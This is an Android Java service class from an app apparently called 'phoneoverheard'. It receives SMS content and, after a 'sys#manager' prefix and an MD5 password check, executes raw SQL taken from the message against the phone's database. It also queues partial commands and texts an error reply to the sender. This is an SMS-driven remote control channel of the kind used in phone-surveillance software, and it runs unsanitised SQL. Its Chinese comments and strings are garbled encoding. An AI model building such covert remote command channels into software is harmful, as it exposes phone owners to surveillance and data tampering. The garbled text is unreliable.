package com.phoneoverheard.phonne;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.DatabaseHelper;
import com.phoneoverheard.database.ManagerService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class smsService extends Service {
    private static final String TAG = "smsService";   
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
    @Override
	public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    @SuppressLint("UnlocalizedSms")	
    public void onStart(Intent intent, int startId) {
        Log.i(TAG, "onStart called.");
        mylog.WrLog("i",TAG,"ִ��sql��䣬ͨ�������޸����ݿ���Ϣ��");
        String sql = "";
        Bundle smscontent = intent.getBundleExtra("smscontent");// ����bundle��key�õ���Ӧ�Ķ���
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");
        ManagerService managerservice = new ManagerService(getBaseContext());
        String password = managerservice.find("manager").getPassword();
        if(contents[4].indexOf("$") != -1){
        	sql = contents[4].replaceAll("\\$", new FileService().MD5(contents[3]));
        }else{
        	sql = contents[4];
        }
        if(contents[4].indexOf(";") != -1){
        	sql = managerservice.find("manager").getCmdsql()+" "+sql;
        	
	        if(contents[0].equals("sys") && contents[1].equals("manager") && new FileService().MD5(contents[2]).equals(password)){
	        	Log.i(TAG, sql);
	        	mylog.WrLog("i",TAG,"ִ��sql��䣺"+sql);
	        	DatabaseHelper databasehelper = new DatabaseHelper(getBaseContext());
		        SQLiteDatabase db = databasehelper.getWritableDatabase();
		        databasehelper.execSQLCmd(db,sql,sendernumber);
		        managerservice.updateCmdsql("manager", "");  
	        }else{
		        // �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
		        SmsManager sms = SmsManager.getDefault();
		        String ErrMsg = "�������������";
		        // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
		        List<String> texts = sms.divideMessage(ErrMsg);
		        for (String text : texts) {
		        	sms.sendTextMessage(sendernumber,null,text,null,null);
		        }
	        }
    	}else{
    		String newcmdsql = "";
            String cmdsql = managerservice.find("manager").getCmdsql();
            if(cmdsql==null||cmdsql==""){
            	newcmdsql=contents[4];
            }else{
            	newcmdsql=cmdsql+" "+contents[4];
            }
            mylog.WrLog("i",TAG,"ִ��sql��䣺"+newcmdsql);
            managerservice.updateCmdsql("manager", newcmdsql);    		
    	}

        onDestroy();		
    } 
 
}
